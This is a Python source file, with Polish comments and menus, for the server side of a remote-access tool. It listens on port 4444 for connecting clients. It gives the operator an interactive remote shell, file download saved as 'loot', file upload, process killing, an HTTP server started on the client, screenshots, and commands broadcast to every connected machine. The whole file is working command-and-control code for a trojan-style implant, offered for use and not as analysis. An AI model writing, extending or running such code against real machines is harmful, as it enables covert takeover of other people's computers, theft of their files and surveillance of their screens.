import socket
import threading
import os
import subprocess
import time
import shutil

HOST = '0.0.0.0'
PORT = 4444

clients = {}  # słownik aktywnych klientów: {id: (socket, addr, os_name)}

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("""
    ╔══════════════════════════════════════════════════════╗
    ║          SERWER ZARZĄDZANIA WIELOMA KLIENTAMI       ║
    ║                  by TwojaNazwa                       ║
    ╚══════════════════════════════════════════════════════╝
    """)

def list_clients():
    print("\n--- AKTYWNI KLIENCI ---")
    if not clients:
        print("Brak aktywnych klientów.")
        return
    for cid, (conn, addr, os_name) in clients.items():
        print(f"[{cid}] {addr[0]}:{addr[1]} - {os_name}")
    print("------------------------")

def send_command_to_client(client_id, command):
    if client_id not in clients:
        print("Nieprawidłowy ID klienta.")
        return
    conn, _, _ = clients[client_id]
    try:
        conn.send(command.encode())
        return True
    except:
        print("Błąd wysyłania komendy. Klient prawdopodobnie rozłączony.")
        del clients[client_id]
        return False

def recv_response(conn, timeout=2):
    """Odbiera odpowiedź z timeoutem"""
    conn.settimeout(timeout)
    response = b""
    try:
        while True:
            chunk = conn.recv(4096)
            if not chunk:
                break
            response += chunk
            if len(chunk) < 4096:
                break
    except socket.timeout:
        pass
    except:
        pass
    conn.settimeout(None)
    return response.decode(errors='ignore')

def download_file(client_id, remote_filename):
    """Pobiera plik z klienta"""
    if client_id not in clients:
        print("Nieprawidłowy ID klienta.")
        return
    conn, addr, _ = clients[client_id]
    try:
        conn.send(f"download {remote_filename}".encode())
        # Odbierz plik
        local_filename = f"loot_{addr[0]}_{os.path.basename(remote_filename)}"
        with open(local_filename, 'wb') as f:
            while True:
                data = conn.recv(4096)
                if data.endswith(b'FILE_TRANSFER_COMPLETE'):
                    f.write(data[:-len(b'FILE_TRANSFER_COMPLETE')])
                    break
                if not data:
                    break
                f.write(data)
        print(f"[+] Pobrano: {local_filename}")
    except Exception as e:
        print(f"Błąd pobierania: {e}")

def upload_file(client_id, local_filename):
    """Wysyła plik do klienta"""
    if client_id not in clients:
        print("Nieprawidłowy ID klienta.")
        return
    conn, _, _ = clients[client_id]
    if not os.path.isfile(local_filename):
        print("Plik nie istnieje lokalnie.")
        return
    try:
        conn.send(f"upload {os.path.basename(local_filename)}".encode())
        time.sleep(0.5)
        with open(local_filename, 'rb') as f:
            while True:
                chunk = f.read(4096)
                if not chunk:
                    break
                conn.send(chunk)
        time.sleep(0.2)
        conn.send(b'FILE_TRANSFER_COMPLETE')
        print(f"[+] Wysłano: {local_filename}")
    except Exception as e:
        print(f"Błąd wysyłania: {e}")

def kill_process_on_client(client_id, process_name):
    """Zamyka proces na kliencie"""
    if client_id not in clients:
        print("Nieprawidłowy ID klienta.")
        return
    send_command_to_client(client_id, f"kill {process_name}")
    time.sleep(1)
    conn, _, _ = clients[client_id]
    print(recv_response(conn))

def broadcast_command(command):
    """Wysyła komendę do wszystkich klientów"""
    for cid in list(clients.keys()):
        print(f"\n--- Wynik od klienta [{cid}] ---")
        send_command_to_client(cid, command)
        time.sleep(1)
        conn, _, _ = clients[cid]
        print(recv_response(conn))

def shell_on_client(client_id):
    """Interaktywna powłoka na wybranym kliencie"""
    if client_id not in clients:
        print("Nieprawidłowy ID klienta.")
        return
    conn, addr, _ = clients[client_id]
    print(f"\nPołączono z {addr[0]}:{addr[1]}. Wpisz 'exit', aby wrócić.")
    while True:
        try:
            cmd = input(f"SHELL[{addr[0]}]> ")
            if not cmd:
                continue
            if cmd.lower() == 'exit':
                break
            conn.send(cmd.encode())
            time.sleep(1)
            print(recv_response(conn, timeout=3))
        except KeyboardInterrupt:
            break
        except:
            print("Połączenie przerwane.")
            del clients[client_id]
            break

def start_http_on_client(client_id, port=8080):
    """Uruchamia serwer HTTP na kliencie"""
    if client_id not in clients:
        print("Nieprawidłowy ID klienta.")
        return
    send_command_to_client(client_id, f"http {port}")
    conn, addr, _ = clients[client_id]
    time.sleep(1)
    print(f"[+] Serwer HTTP uruchomiony na http://{addr[0]}:{port}")
    print("[+] Katalog: C:\\Users\\Public\\Documents")

def screenshot(client_id):
    """Próbuje zrobić screenshot na kliencie (wymaga biblioteki pyautogui)"""
    if client_id not in clients:
        print("Nieprawidłowy ID klienta.")
        return
    send_command_to_client(client_id, "screenshot")
    time.sleep(2)
    download_file(client_id, "screenshot.png")

def handle_new_client(conn, addr):
    """Obsługa nowego klienta w osobnym wątku"""
    # Odbierz informacje o systemie
    conn.send(b"info")
    time.sleep(0.5)
    info = recv_response(conn, timeout=2)
    
    client_id = len(clients) + 1
    clients[client_id] = (conn, addr, info.strip() or "Windows")
    print(f"\n[+] NOWY KLIENT [{client_id}] {addr[0]}:{addr[1]} - {info.strip()}")

def accept_clients():
    """Główny wątek nasłuchujący"""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((HOST, PORT))
        s.listen(5)
        print(f"[*] Nasłuchiwanie na porcie {PORT}...")
        while True:
            conn, addr = s.accept()
            threading.Thread(target=handle_new_client, args=(conn, addr), daemon=True).start()

def main_menu():
    """Główne menu serwera"""
    while True:
        banner()
        list_clients()
        print("\n=== MENU ===")
        print("1. Połącz powłoką z klientem")
        print("2. Pobierz plik z klienta")
        print("3. Wyślij plik do klienta")
        print("4. Zamknij proces na kliencie")
        print("5. Uruchom serwer HTTP na kliencie")
        print("6. Zrób screenshot (jeśli obsługiwane)")
        print("7. Wyślij komendę do wszystkich")
        print("8. Wyślij niestandardową komendę do klienta")
        print("0. Wyjście")
        
        choice = input("\nWybierz opcję: ")
        
        if choice == '0':
            print("Do widzenia!")
            os._exit(0)
        
        if not clients:
            print("Brak klientów. Czekam...")
            time.sleep(2)
            continue
        
        if choice == '1':
            cid = int(input("Podaj ID klienta: "))
            shell_on_client(cid)
        
        elif choice == '2':
            cid = int(input("Podaj ID klienta: "))
            fname = input("Ścieżka pliku na kliencie: ")
            download_file(cid, fname)
            input("\nEnter, aby kontynuować...")
        
        elif choice == '3':
            cid = int(input("Podaj ID klienta: "))
            fname = input("Lokalna ścieżka pliku do wysłania: ")
            upload_file(cid, fname)
            input("\nEnter, aby kontynuować...")
        
        elif choice == '4':
            cid = int(input("Podaj ID klienta: "))
            proc = input("Nazwa procesu (np. notepad.exe): ")
            kill_process_on_client(cid, proc)
            input("\nEnter, aby kontynuować...")
        
        elif choice == '5':
            cid = int(input("Podaj ID klienta: "))
            port = input("Port HTTP (domyślnie 8080): ") or "8080"
            start_http_on_client(cid, int(port))
            input("\nEnter, aby kontynuować...")
        
        elif choice == '6':
            cid = int(input("Podaj ID klienta: "))
            screenshot(cid)
            input("\nEnter, aby kontynuować...")
        
        elif choice == '7':
            cmd = input("Komenda do wysłania do wszystkich: ")
            broadcast_command(cmd)
            input("\nEnter, aby kontynuować...")
        
        elif choice == '8':
            cid = int(input("Podaj ID klienta: "))
            cmd = input("Komenda: ")
            send_command_to_client(cid, cmd)
            time.sleep(1)
            conn, _, _ = clients[cid]
            print(recv_response(conn))
            input("\nEnter, aby kontynuować...")
        
        else:
            print("Nieprawidłowa opcja!")
            time.sleep(1)

if __name__ == '__main__':
    # Uruchom nasłuchiwanie w osobnym wątku
    listener_thread = threading.Thread(target=accept_clients, daemon=True)
    listener_thread.start()
    time.sleep(1)
    
    # Uruchom menu główne
    main_menu()
